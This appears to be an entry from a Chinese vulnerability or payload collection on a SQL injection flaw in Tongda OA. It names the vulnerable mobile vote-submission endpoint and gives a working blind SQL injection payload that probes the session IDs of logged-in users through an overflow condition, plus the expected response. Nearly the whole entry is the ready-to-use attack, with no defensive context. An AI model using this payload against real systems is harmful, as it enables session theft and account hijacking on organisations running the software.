# 通达OAsql注入漏洞

通达OA ｜ SQL注入 ｜ —
- **请求**：`POST /mobile/api/qyapp.vote.submit.php HTTP/1.1`

**Payload**
```
submitData={"a":{"vote_type":"1","vote_id":"if(length((select SID from user_online limit 0,1))=26,1,2*1e308)","value":"1"}}
```
- **响应特征**：200